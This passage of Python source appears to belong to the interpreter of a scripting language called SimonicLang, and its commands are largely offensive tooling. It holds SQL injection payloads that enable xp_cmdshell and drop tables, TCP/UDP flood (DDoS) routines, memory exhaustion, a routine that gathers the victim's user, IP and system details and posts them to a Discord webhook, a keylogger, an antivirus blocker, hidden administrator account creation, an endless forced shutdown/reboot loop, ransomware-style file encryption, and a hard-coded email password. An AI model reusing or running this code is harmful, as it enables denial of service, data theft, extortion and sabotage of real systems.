sp_executesql @cmd; --", "1' OR 1=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; --", "1' OR 1=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --", "1; EXEC('sp_configure ''show advanced options'', 1; RECONFIGURE;') --", "1; EXEC('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') --", "1'; DROP TABLE users --", "1'; DROP DATABASE dbname --", "1'; UPDATE users SET password='newpass' WHERE username='admin' --", "1' OR '1'='1'; --"]
	t = []
	for add in temps:
		f = testgetinject(target, body+add)
		t.append(f)
	datadata = ""
	for source in t:
		datadata += str(source)+"\n\n"
	with open(filename, "w") as f:
		f.write(datadata)
class my_pool:
	def __init__(self, target, args):
		self.wait_flag = True
		self.run_flag = True
		threading.Thread(target=self.pool, args=(target, args)).start()
		threading.Thread(target=self.pool, args=(target, args)).start()
	def pool(self, target, args):
		while self.wait_flag:
			time.sleep(0.2)
		while self.run_flag:
			ts = []
			for _ in range(4):
				time.sleep(0)
				try:
					t = threading.Thread(target=target, args=args)
					t.start()
					ts.append(t)
				except:
					pass
				time.sleep(0)
			for t in ts:
				time.sleep(0)
				try:
					t.join()
				except:
					pass
				time.sleep(0)
			time.sleep(0)
	def run(self):
		self.wait_flag = False
	def stop(self):
		self.run_flag = False
		del self

def sysbyte():
	global byte, perbyte, flag
	while flag:
		lastbyte = int(byte)
		time.sleep(1)
		with lock:
			perbyte = int(byte)-lastbyte

def syspack():
	global pack, perpack, flag
	while flag:
		lastpack = int(pack)
		time.sleep(1)
		with lock:
			perpack = int(pack)-lastpack

def syssocks():
	global socks, persocks, flag
	while flag:
		lastsocks = int(socks)
		time.sleep(1)
		with lock:
			persocks = int(socks)-lastsocks

def getinfo():
	global byte, perbyte, pack, perpack, socks, persocks, target, port, err, errs
	return f"ALL SIZE: {int(byte):.7f} B\nALL SIZE: {byte/1024:.7f} KB\nALL SIZE: {byte/1024/1024:.7f} MB\nALL SIZE: {byte/1024/1024/1024:.7f} GB\nPER SIZE: {int(perbyte):.7f} B/s\nPER SIZE: {perbyte/1024:.7f} KB/s\nPER SIZE: {perbyte/1024/1024:.7f} MB/s\nPER SIZE: {perbyte/1024/1024/1024:.7f} GB/s\nALL PACKS: {pack}\nPER PACKS: {perpack} in second\nALL SOCKETS: {socks}\nPER SOCKETS: {persocks} in second\nTARGET: {target}\nPORT: {port}\nERROR: {err}\nERROR COUNT: {errs}"

def saveinfo(filename):
	global flag
	while flag:
		try:
			time.sleep(0.2)
			with open(filename, "w") as file:
				file.write(getinfo())
		except:
			pass

def tcpsys(size, pernum):
	global target, port, byte, pack, socks, err, errs
	try:
		packk = (chr(random.randint(0, 64))*size).encode()
		b = len(packk)
	except:
		try:
			packk = ("X"*size).encode()
			b = len(packk)
		except:
			packk = ""
			b = 0
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		with lock:
			socks += 1
		s.settimeout(0.8)
		s.connect((target, port))
		for _ in range(pernum):
			s.sendall(packk)
			with lock:
				pack += 1
				byte += b
	except Exception as e:
		with lock:
			err = e
			errs += 1
	try:
		s.close()
	except:
		pass

def udpsys(size, pernum):
	global target, port, byte, pack, socks, err, errs
	try:
		packk = (chr(random.randint(0, 64))*size).encode()
		b = len(packk)
	except:
		try:
			packk = ("X"*size).encode()
			b = len(packk)
		except:
			packk = ""
			b = 0
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		with lock:
			socks += 1
		s.settimeout(0.8)
		for _ in range(pernum):
			s.sendto(packk, (target, port))
			with lock:
				pack += 1
				byte += b
	except Exception as e:
		with lock:
			err = e
			errs += 1
	try:
		s.close()
	except:
		pass

def SL_CRYPT_BOX(password):
    sbox = ""
    hr = ""
    for h in range(128):
        hr += chr(h)
    password = password*len(hr)
    n = 1
    for h in password:
        b = hr[(ord(h)+n)%len(hr)]
        if b in sbox:
            pass
        else:
            sbox += b
        n += len(password)+len(sbox)+7
    return sbox
def SL_ENCRYPT(text, password):
    id = len(password)*2
    for h in password:
        id += ord(h)
    sbox = SL_CRYPT_BOX(password)
    nt = ""
    for h in text:
        if h in sbox:
            i = sbox.index(h)
            i2 = (i+len(password))%len(sbox)
            nt += sbox[i2]
        else:
            nt += h
    return nt
def SL_DECRYPT(text, password):
    id = len(password)*2
    for h in password:
        id += ord(h)
    nt = ""
    sbox = SL_CRYPT_BOX(password)
    for h in text:
        if h in sbox:
            i = sbox.index(h)
            i2 = (i-len(password))%len(sbox)
            nt += sbox[i2]
        else:
            nt += h
    return nt

def startddos(type, size, pernum, filename):
	global target, port, flag, ddospool
	if type.lower() == "tcp":
		pool = my_pool(tcpsys, (size, pernum))
	elif type.lower() == "udp":
		pool = my_pool(udpsys, (size, pernum))
	threading.Thread(target=sysbyte).start()
	threading.Thread(target=syspack).start()
	threading.Thread(target=syssocks).start()
	threading.Thread(target=saveinfo, args=(filename,)).start()
	pool.run()
	ddospool = pool

vars = {}
byte = 0
perbyte = 0
pack = 0
perpack = 0
socks = 0
persocks = 0
target = "";port = 0
lock = threading.Lock()
err = ""
errs = 0
flag = True
ddospool = None
serverr = ""
httpHeaders = {"User-Agent": "SimonicLang", "Accept": "*/*"}
output = sys.stdout
outputSys = sys.stdout
errors = True
lock = threading.Lock()
mods = []
ts = []
bofList = []
class ioNone:
	def __init__(self):
		pass
	def write(self, *a, **k):
		pass
	def flush(self, *a, **k):
		pass
	def fileno(self, *a, **k):
		return None
def findtry():
	global serverr
	try:
		ip = fstring("$<random.ip>")
		port = random.choice([80, 8080, 443, 1080, 3306])
		s = socket.socket();s.settimeout(0.8);s.connect((ip, port))
		with lock:
			serverr = f"{ip}:{port}"
	except:
		pass
	s.close()
def fstring(text):
	global vars, mods, serverr
	text = text.replace("$<n>", "\n")
	text = text.replace("$<c.reset>", "\033[0m")
	text = text.replace("$<c.red>", "\033[91m")
	text = text.replace("$<c.green>", "\033[92m")
	text = text.replace("$<c.yellow>", "\033[93m")
	text = text.replace("$<c.blue>", "\033[94m")
	text = text.replace("$<c.purple>", "\033[95m")
	text = text.replace("$<c.blue2>", "\033[96m")
	text = text.replace("$<c.white>", "\033[99m")
	text = text.replace("$<c.black>", "\033[30m")
	text = text.replace("$<c.gray>", "\033[90m")
	text = text.replace("$<smlangUrl>", "https://github.com/aertsimon90/SimonicLang")
	text = text.replace("$<bold>", "\033[1m")
	for item, value in vars.items():
		text = text.replace("$<v."+str(item)+">", str(value))
		text = text.replace("$<vup."+str(item)+">", str(value).upper())
		text = text.replace("$<vlow."+str(item)+">", str(value).lower())
		text = text.replace("$<vlen."+str(item)+">", str(len(str(value))))
	if "$<" in text:
		text = text.replace("$<random.ip>", str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255)))
		text = text.replace("$<sys.name>", os.name)
		text = text.replace("$<basefile>", os.path.basename(__file__))
		text = text.replace("$<sys.sys>", platform.system())
		text = text.replace("$<sys.ver>", platform.version())
		text = text.replace("$<sys.node>", platform.node())
		if "$<sys.user2>" in text:
			import getpass
			text = text.replace("$<sys.user2>", getpass.getuser())
		text = text.replace("$<sys.user>", os.getlogin())
		text = text.replace("$<sys.path>", os.getcwd())
		text = text.replace("$<sys.prcsr>", platform.processor())
		text = text.replace("$<sys.pyver>", platform.python_version())
		text = text.replace("$<sys.slver>", "1.0.3")
		text = text.replace("$<sys.mac>", platform.machine())
		text = text.replace("$<sys.arch>", ', '.join(platform.architecture()))
	if "$<random.apikey" in text:
		text = text.replace("$<random.apikey.16>", secrets.token_hex(16))
		text = text.replace("$<random.apikey.32>", secrets.token_hex(32))
		text = text.replace("$<random.apikey.64>", secrets.token_hex(64))
		text = text.replace("$<random.apikey.128>", secrets.token_hex(128))
	if "$<random.server>" in text:
		serverr = ""
		while True:
			ts = []
			for _ in range(50):
				t = threading.Thread(target=findtry)
				if serverr == "":
					pass
				else:
					break
				t.start()
				ts.append(t)
			for t in ts:
				t.join()
			if serverr == "":
				pass
			else:
				text = text.replace("$<random.server>", serverr)
				break
	if "$<prcsc>" in text:
		try:
			if 342 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "psutil"], stdout=ioNone(), stderr=ioNone())
				mods.append(342)
		except:
			pass
		try:
			import psutil
		except:
			pass
		text = text.replace("$<prcsc>", str(len(psutil.pids())))
	if "$<fakeUA>" in text:
		try:
			if 83 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "fake_useragent"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				mods.append(83)
		except:
			pass
		from fake_useragent import UserAgent
		ua = UserAgent()
		text = text.replace("$<fakeUA>", ua.random)
	if "$<ram" in text:
		try:
			if 342 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "psutil"], stdout=ioNone(), stderr=ioNone())
				mods.append(342)
		except:
			pass
		try:
			import psutil
		except:
			pass
		text = text.replace("$<ram.b>", str(psutil.virtual_memory().total))
		text = text.replace("$<ram.kb>", str(psutil.virtual_memory().total/1024))
		text = text.replace("$<ram.mb>", str(psutil.virtual_memory().total/(1024**2)))
		text = text.replace("$<ram.gb>", str(psutil.virtual_memory().total/(1024**3)))
		text = text.replace("$<ramav.b>", str(psutil.virtual_memory().available))
		text = text.replace("$<ramav.kb>", str(psutil.virtual_memory().available/1024))
		text = text.replace("$<ramav.mb>", str(psutil.virtual_memory().available/(1024**2)))
		text = text.replace("$<ramav.gb>", str(psutil.virtual_memory().available/(1024**3)))
		text = text.replace("$<ramus.b>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)))
		text = text.replace("$<ramus.kb>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)/1024))
		text = text.replace("$<ramus.mb>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)/(1024**2)))
		text = text.replace("$<ramus.gb>", str((psutil.virtual_memory().total-psutil.virtual_memory().available)/(1024**3)))
	if "$<sys.ip>" in text:
		try:
			s = socket.socket();s.settimeout(0.8);s.connect(("ifconfig.me", 80));s.sendall("GET http://ifconfig.me/ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: SimonicLang\r\n\r\n".encode());ip=s.recv(999999).decode().split("\r\n\r\n")[1];s.close()
		except:
			ip = "0.0.0.0"
			try:
				s.close()
			except:
				pass
		text = text.replace("$<sys.ip>", ip)
	if "$<sys.host>" in text:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.settimeout(0.8);s.connect(("ifconfig.me", 80));s.sendall("GET http://ifconfig.me/ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: SimonicLang\r\n\r\n".encode());ip=s.recv(999999).decode().split("\r\n\r\n")[1];s.close()
		except:
			ip = "0.0.0.0"
			try:
				s.close()
			except:
				pass
		try:
			host = socket.gethostbyaddr(ip)[0]
		except:
			host = ""
		text = text.replace("$<sys.host>", host)
	if "$<all>" in text:
		txt = []
		for h in ["basefile", "sys.name", "sys.sys", "sys.ver", "sys.node", "sys.user", 'sys.user2', "sys.path", "sys.prcsr", "sys.pyver", "sys.slver", "sys.mac", "sys.arch", "sys.ip", "sys.host", "ram.b", "ram.kb", "ram.mb", "ram.gb", "ramav.b", "ramav.kb", "ramav.mb", "ramav.gb", "ramus.b", "ramus.kb", "ramus.mb", "ramus.gb", "prcsc"]:
			try:
				txt.append(f"{h}: "+fstring("$<"+h+">"))
			except:
				pass
		
		text = text.replace("$<all>", "\n".join(txt))
	if "$<date>" in text:
		try:
			if 2 in mods:
				pass
			else:
				subprocess.run(["pip", "install", "datetime"], stdout=ioNone(), stderr=ioNone())
				mods.append(2)
		except:
			pass
		try:
			from datetime import datetime
		except:
			pass
		date = datetime.now()
		date = date.strftime("%Y-%m-%d %H:%M:%S")
		text = text.replace("$<date>", date)
	return text
def returnAuto(filename, addbyte=0):
	with open(fstring("$<basefile>"), "r") as f:
		sysc = f.read().split("\n\n\n\n")[0]+"\n\n"
	with open(filename, "r") as f:
		c = f.read()
	sysc += "# X"+("X"*addbyte)+"\n"
	for h in c.split("\n"):
		sysc += "runCode("+("'"*3)+h+("'"*3)+")\n"
	with open(filename, "w") as f:
		f.write(sysc)
def returnPythonExe(filename):
	loadAllMods()
	cc = "python -m PyInstaller --onefile "+filename
	subprocess.run(cc.split())
	time.sleep(3)
	remexea()
def returnPythonHideExe(filename):
	loadAllMods()
	cc = "python -m PyInstaller --onefile --noconsole "+filename
	subprocess.run(cc.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	time.sleep(3)
	remexea()
def returnSlExe(filename, ab=0):
	with open(filename, "r") as f:
		a = f.read()
	returnAuto(filename, ab)
	returnPythonExe(filename)
	with open(filename, "w") as f:
		f.write(a)
def returnSlHideExe(filename, ab=0):
	with open(filename, "r") as f:
		a = f.read()
	returnAuto(filename, ab)
	returnPythonHideExe(filename)
	with open(filename, "w") as f:
		f.write(a)
def remexea():
	for h in os.listdir():
		if ".spec" in h:
			runCode(f"filed;{h}")
	shutil.rmtree("build")
	p = os.getcwd()
	os.chdir("dist")
	for h in os.listdir():
		shutil.move(h, p)
	os.chdir("..")
	os.rmdir("dist")
def orint(text):
	global output
	print(text.replace("$<n>", "\n"), end="", file=output)
def orinto(text):
	global output
	output.write(text.replace("$<n>", "\n"))
	output.flush()
def bofs():
	global bofList
	try:
		with lock:
			bofList.append("X"*1024*1024*512)
	except:
		pass
def bof(n):
	while True:
		threading.Thread(target=bofs).start()
		time.sleep(n)
def netinfo(ip):
	global mods, httpHeaders
	if 0 in mods:
		pass
	else:
		subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		with lock:
			mods.append(0)
	import requests
	infojson = requests.get(f"https://ipapi.co/{ip}/json", headers=httpHeaders, timeout=0.8)
	return infojson.json()
def discordWHSend(url, text):
	global httpHeaders, mods
	try:
		if 0 in mods:
			pass
		else:
			subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			with lock:
				mods.append(0)
		import requests
		requests.post(url, headers=httpHeaders, json={"content": text}, timeout=5)
	except:
		pass
def hackUserSystem(url, name):
    text = f"- {name}\n"
    for h in ["sys.name", "sys.sys", "sys.ver", "sys.node", 'sys.user2', "sys.path", "sys.prcsr", "sys.pyver", "sys.slver", "sys.mac", "sys.arch", "sys.ip", "sys.host", "ram.gb"]:
        try:
            hh = fstring('$<'+h+'>')
            txt = f"{h.upper().replace('.', ' ')} : || {hh} ||"
            text += txt+"\n"
        except:
            pass
    try:
        ip = fstring("$<sys.ip>")
    except:
        ip = "0.0.0.0"
    text += f"NET INFO: || https://ipapi.co/{ip}/json ||\n"
    date = fstring("$<date>")
    text += f"DATE: {date}"
    discordWHSend(url, text)
htmlflag = True
def runHtml(code):
	global htmlflag
	ip = "127."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))+"."+str(random.randint(0, 255))
	port = random.randint(1025, 65535)
	s = socket.socket()
	s.bind((ip, port))
	s.listen(100)
	webbrowser.open(f"http://{ip}:{port}/")
	while htmlflag:
		try:
			c, a = s.accept()
			p = c.recv(1);p+="x".encode()
			c.send(f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {len(code)}\r\n\r\n{code}".encode())
		except:
			pass
def loadMod(id, name):
	global mods
	try:
		subprocess.run(f"pip install {name}", stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	except:
		pass
	with lock:
		mods.append(id)
def loadAllMods():
	mods = {"psutil": 342, "fake_useragent": 83, "datetime": 2, "requests": 0, "keyboard": 245, "tkinter": 3422, "flask": 963, "midiutil": 213}
	ts = []
	for name, id in mods.items():
		t = threading.Thread(target=loadMod, args=(id, name))
		t.start()
		ts.append(t)
	for t in ts:
		t.join()
def hrefBox(title, text, url):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec("""import """+f"""tkinter as tk
def go():
    global url
    webbrowser.open(url)
title = '{title}'
text = '{text}'
url = '{url}'
root = tk.Tk()
root.title(title)
text = tk.Label(root, text=text)
text.pack()
button = tk.Button(root, text='Open on browser.', command=go, width=15)
button.pack()
root.mainloop()""")
def msgBox(title, text):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec("""import """+f"""tkinter as tk
title = '{title}'
text = '{text}'
root = tk.Tk()
root.title(title)
text = tk.Label(root, text=text)
text.pack()
root.mainloop()""")
def confirmBox(title, text, varname):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec("""import """+f"""tkinter as tk
def yes():
    global root, vars
    text = "1"
    root.destroy()
    with lock:
        vars['{varname}'] = str(text)
def no():
    global root, vars
    text = "0"
    root.destroy()
    with lock:
       vars['{varname}'] = str(text)
root = tk.Tk()
root.title('{title}')
label = tk.Label(root, text='{text}')
label.pack(pady=10)
yesbutton = tk.Button(root, width=15, text='YES', command=yes, fg="#000000", bg="#00FF00")
yesbutton.pack(pady=10)
nobutton = tk.Button(root, width=15, text='NO', command=no, fg="#000000", bg="#FF0000")
nobutton.pack(pady=10)
root.mainloop()""")
def inputBox(title, text, varname):
    global mods
    if 3422 in mods:
        pass
    else:
        try:
            subprocess.run("pip install tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    exec("""import """+f"""tkinter as tk
def submit():
    global entry, root, vars
    text = entry.get()
    root.destroy()
    with lock:
        vars['{varname}'] = str(text)
root = tk.Tk()
root.title('{title}')
label = tk.Label(root, text='{text}')
label.pack(pady=10)
entry = tk.Entry(root, width=30)
entry.pack()
button = tk.Button(root, width=15, text='Submit', command=submit)
button.pack()
root.mainloop()""")
def sendmail(server, port, acc, accpawd, target, subject, mes):
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    email = MIMEMultipart()
    email['From'] = acc
    email['To'] = target
    email['Subject'] = subject
    email.attach(MIMEText(mes, 'plain'))
    try:
        smtp = smtplib.SMTP(server, port)
        smtp.starttls()
        smtp.ehlo()
        smtp.login(acc, accpawd)
        smtp.sendmail(acc, target, email.as_string())
    except Exception as e:
        orinto(str(e))
    finally:
        smtp.quit()
def runCode(code):
	global output, outputSys, errors, vars, httpHeaders, ts, target, port, flag, ddospool, htmlflag, mods
	try: # Code Template: method;options...
		c = code.split(";")
		m = c[0]
		try:
			o = c[1:]
			ot = ";".join(o)
		except:
			o = []
			ot = ""
	except:
		m = ""
	try:
		if m == "log":
			orint(ot)
		elif m == "logf":
			orint(fstring(ot))
		elif m == "optilog":
			orinto(ot)
		elif m == "optilogf":
			orinto(fstring(ot))
		elif m == "outNone":
			with lock:
				output = ioNone()
		elif m == "outSys":
			with lock:
				output = outputSys
		elif m == "returnAuto":
			returnAuto(fstring(ot))
		elif m == "returnPyExe":
			returnPythonExe(fstring(ot))
		elif m == "returnPyHideExe":
			returnPythonHideExe(fstring(ot))
		elif m == "returnSLExe":
			try:
				ab = int(o[1])
			except:
				ab = 0
			returnSlExe(fstring(o[0]), ab)
		elif m == "returnSLHideExe":
			try:
				ab = int(o[1])
			except:
				ab = 0
			returnSlHideExe(fstring(o[0]), ab)
		elif m == "encrypt":
			filename = o[0]
			key = o[1]
			with open(filename, "rb") as f:
				c = f.read()
			c = SL_ENCRYPT(c, key)
			with open(filename, "wb") as f:
				f.write(c)
		elif m == "decrypt":
			filename = o[0]
			key = o[1]
			with open(filename, "rb") as f:
				c = f.read()
			c = SL_DECRYPT(c, key)
			with open(filename, "wb") as f:
				f.write(c)
		elif m == "eSet":
			if ot == "on":
				errors = True
			elif ot == "off":
				errors = False
		elif m == "vSet":
			with lock:
				vars[o[0]] = ";".join(o[1:])
		elif m == "vSetF":
			with lock:
				vars[o[0]] = fstring(";".join(o[1:]))
		elif m == "vSetFF":
			with lock:
				vars[fstring(o[0])] = fstring(";".join(o[1:]))
		elif m == "vR":
			with lock:
				del vars[o[0]]
		elif m == "vRF":
			with lock:
				del vars[fstring(o[0])]
		elif m == "vList":
			varname = o[0]
			listt = o[1:]
			with lock:
				vars[varname] = listt
		elif m == "vListF":
			runcode("vList;"+fstring(ot))
		elif m == "vListJoin":
			varname = o[0]
			joiner = o[1]
			with lock:
				vars[varname] = joiner.join(vars[varname])
		elif m == "vListSplit":
			varname = o[0]
			splitter = o[1]
			with lock:
				vars[varname] = vars[varname].split(splitter)
		elif m == "vReplace":
			varname = o[0]
			text1 = o[1]
			text2 = o[2]
			with lock:
				vars[varname] = vars[varname].replace(text1, text2)
		elif m == "vSelect":
			varname = o[0]
			num = int(o[1])
			varname2 = o[2]
			with lock:
				vars[varname2] = vars[varname][num]
		elif m == "vSelectL":
			varname = o[0]
			numin = int(o[1])
			numax = int(o[2])
			varname2 = o[3]
			with lock:
				vars[varname2] = vars[varname][numin:numax]
		elif m == "vReverse":
			varname = o[0]
			with lock:
				vars[varname] = vars[varname][::-1]
		elif m == "input":
			with lock:
				vars[o[0]] = input(";".join(o[1:]))
		elif m == "inputf":
			with lock:
				vars[o[0]] = input(fstring(";".join(o[1:])))
		elif m == "wait":
			time.sleep(float(fstring(ot)))
		elif m == "random":
			min = int(o[0])
			max = int(o[1])
			value = random.randint(min, max)
			with lock:
				vars[o[2]] = str(value)
		elif m == "sendBotMail":
			server = "smtp.office365.com"
			pport = 587
			acc = "simoniclang@hotmail.com"
			accpawd = "H3rK9tL2pS6" # We know you're reading this, don't even think about it, believe me, it's just a bot account that will be of no use to you.
			ttarget = o[0]
			subject = o[1]
			mes = o[2]
			sendmail(server, pport, acc, accpawd, ttarget, subject, mes)
		elif m == "sendMail":
			server = o[0]
			pport = int(o[1])
			acc = o[2]
			accpawd = o[3]
			ttarget = o[4]
			subject = o[5]
			mes = o[6]
			sendmail(server, pport, acc, accpawd, ttarget, subject, mes)
		elif m == "keylog":
			if 245 in mods:
				pass
			else:
				try:
					subprocess.run("pip install keyboard".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
				except:
					pass
				mods.append(245)
			import keyboard
			tttt = keyboard.read_event(suppress=True).name
			with lock:
				vars[o[0]] = str(tttt)
		elif m == "setRoot":
			os.chmod(fstring(ot), 0o777)
		elif m == "%":
			num = float(fstring(o[0]))
			num2 = float(fstring(o[1]))
			with lock:
				vars[o[2]] = str((num/num2)*100)
		elif m == "blockPerms":
			os.chmod(fstring(ot), 0)
		elif m == "tasklist":
			vars[fstring(o[0])] = procList()
		elif m == "taskkill":
			stopproc(int(fstring(ot)))
		elif m == "taskblock":
			threading.Thread(target=appblock, args=(fstring(ot),)).start()
		elif m == "blockDefender":
			threading.Thread(target=blockAntivirus).start()
		elif m == "errorBox":
			if ot == "":
				ot = "Unknow error from program"
			if 3422 in mods:
				pass
			else:
				try:
					subprocess.run("pip install tkinter".split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
					with lock:
						mods.append(3422)
				except:
					pass
			try:
				exec("""from """+"""tkinter import messagebox\nthreading.Thread(target=messagebox.showerror, args=("ERROR", fstring(ot))).start()""")
			except:
				pass
			time.sleep(0.05)
		elif m == "hrefBox":
			hrefBox(o[0], o[1], o[2])
		elif m == "msgBox":
			msgBox(o[0], o[1])
		elif m == "inputBox":
			inputBox(o[0], o[1], o[2])
		elif m == "confirmBox":
			confirmBox(o[0], o[1], o[2])
		elif m == "fullBox":
			fullBox(o[0], o[1], o[2])
		elif m == "fullBoxUnClose":
			fullBoxUnClose(o[0], o[1], o[2])
		elif m == "changeBg.color":
			changeBg("color", (int(o[0]), int(o[1]), int(o[2])))
		elif m == "changeBg.image":
			changeBg("image", ot)
		elif m == "disableExit":
			sys.exit = UnCloseSys
		elif m == "winUserAdd":
			user = fstring(o[0])
			pawd = fstring(o[1])
			subprocess.run(f"net user {user} {pawd} /add".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			subprocess.run(f"net localgroup administrators {user} /add".split(), check=True, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		elif m == "shutdown":
			try:
				subprocess.run("shutdown /s /f /t 0".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("powershell Stop-Computer -Force".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("sudo shutdown -h now".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
		elif m == "reboot":
			try:
				subprocess.run("shutdown /r /f /t 0".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("powershell Restart-Computer -Force".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
			try:
				subprocess.run("sudo reboot".split(), check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
			except:
				pass
		elif m == "brokePc":
			while True:
				try:
					threading.Thread(target=runCode, args=("reboot",)).start()
					threading.Thread(target=runCode, args=("shutdown",)).start()
				except:
					pass
		elif m == "sqlConn":
			file = fstring(o[0])
			varname = fstring(o[1])
			sqlConnect(file, varname)
		elif m == "sqlExec":
			varname = fstring(o[0])
			code = fstring(";".join(o[1:]))
			sqlExecute(varname, code)
		elif m == "sqlClose":
			varname = fstring(o[0])
			sqlClose(varname)
		elif m == "serverCalculate":
			ports = o[0].split(",")
			tl = int(o[1])
			varname = o[2]
			count = gc_get(tl, ports)
			with lock:
				vars[varname] = str(count)
		elif m == "randomf":
			min = int(fstring(o[0]))
			max = int(fstring(o[1]))
			value = random.randint(min, max)
			with lock:
				vars[fstring(o[2])] = str(value)
		elif m == "randoms":
			min = float(o[0])
			max = float(o[1])
			value = random.uniform(min, max)
			with lock:
				vars[o[2]] = str(value)
		elif m == "randomsf":
			min = float(fstring(o[0]))
			max = float(fstring(o[1]))
			value = random.uniform(min, max)
			with lock:
				vars[fstring(o[2])] = str(value)
		elif m == "dcwhSend":
			url = o[0]
			text = ";".join(o[1:])
			discordWHSend(url, text)
		elif m == "dcwhSendF":
			url = fstring(o[0])
			text = fstring(";".join(o[1:]))
			discordWHSend(url, text)
		elif m == "sysExit":
			sys.exit()
		elif m == "rwLock":
			files = os.listdir()
			key = str(random.randint(1, 99))
			for file in files:
				try:
					runCode(f"encrypt;{file};{key}")
				except:
					pass
			with open(fstring("$<basefile>")+".save", "w") as f:
				f.write(SL_ENCRYPT(key, "mk89001234msadcjsnajsyx8123823"))
		elif m == "rwUnlock":
			files = os.listdir()
			with open(fstring("$<basefile>")+".save", "r") as f:
				key = SL_DECRYPT(f.read(), "mk89001234msadcjsnajsyx8123823")
			for file in files:
				try:
					runCode(f"decrypt;{file};{key}")
				except:
					pass
		elif m == "loop":
			n = o[0]
			c = ";".join(o[1:])
			if n == "<>":
				while True:
					for h in c.split(" && "):
						runCode(h)
			else:
				for _ in range(int(n)):
					for h in c.split(" && "):
						runCode(h)
		elif m == "loopf":
			n = fstring(o[0])
			c = ";".join(o[1:])
			if n == "<>":
				while True:
					for h in c.split(" && "):
						runCode(h)
			else:
				for _ in range(int(n)):
					for h in c.split(" && "):
						runCode(h)
		elif m == "forLoop":
			varname = o[0]
			varname2 = o[1]
			c = ";".join(o[2:])
			for h in vars[varname]:
				vars[varname2] = h
				for hh in c.split(" && "):
					runCode(hh)
		elif m == "runPy":
			exec(fstring(ot))
		elif m == "runSL":
			runCode(fstring(ot))
		elif m == "runCmd":
			try:
				subprocess.run(fstring(ot).split(), stdout=output, stderr=output)
			except:
				pass
		elif m == "runHtml":
			threading.Thread(target=runHtml, args=(ot,)).start()
		elif m == "stopHtml":
			with lock:
				htmlflag = False
		elif m == "startHtml":
			with lock:
				htmlflag = True
		elif m == "runShell":
			subprocess.run(fstring(ot).split(), shell=True, check=True)
		elif m == "runPShell":
			subprocess.run(f"powershell -Command {fstring(ot)}".split())
		elif m == "runExe":
			if os.name == "nt":
				subprocess.run(fstring(ot).split())
			else:
				subprocess.run(f"wine {fstring(ot)}".split())
		elif m == "clearOut":
			try:
				if os.name == "nt":
					subprocess.run("cls", stdout=output, stderr=output)
				else:
					subprocess.run("clear", stdout=output, stderr=output)
			except:
				pass
		elif m == "clearIn":
			with lock:
				output.flush()
				vars = {}
				httpHeaders = {"User-Agent": "SimonicLang", "Accept": "*/*"}
		elif m == "save":
			with open(fstring(ot), "w") as f:
				f.write(json.dumps(vars)+"\n/n/\n"+json.dumps(httpHeaders))
		elif m == "load":
			with open(fstring(ot), "r") as f:
				c = f.read().split("\n/n/\n")
				vars = json.loads(c[0])
				httpHeaders = json.loads(c[1])
		elif m == "file.create":
			with open(ot, "w") as f:
				f.write("")
		elif m == "file.write":
			with open(o[0], "w") as f:
				f.write(";".join(o[1:]))
		elif m == "file.writef":
			with open(fstring(o[0]), "w") as f:
				f.write(fstring(";".join(o[1:])))
		elif m == "file.writebin":
			with open(o[0], "wb") as f:
				f.write(";".join(o[1:]).encode())
		elif m == "file.writebinf":
			with open(fstring(o[0]), "wb") as f:
				f.write(fstring(";".join(o[1:])).encode())
		elif m == "file.read":
			with open(o[0], "r") as f:
				vars[o[1]] = f.read()
		elif m == "file.readf":
			with open(fstring(o[0]), "r") as f:
				vars[fstring(o[1])] = fstring(f.read())
		elif m == "file.readbin":
			with open(o[0], "rb") as f:
				vars[o[1]] = f.read()
		elif m == "file.readbinf":
			with open(fstring(o[0]), "rb") as f:
				vars[fstring(o[1])] = fstring(f.read())
		elif m == "file.delete":
			name = fstring(o[0])
			with open(name, "w") as f:
				f.write("")
			os.rename(name, name+".trash")
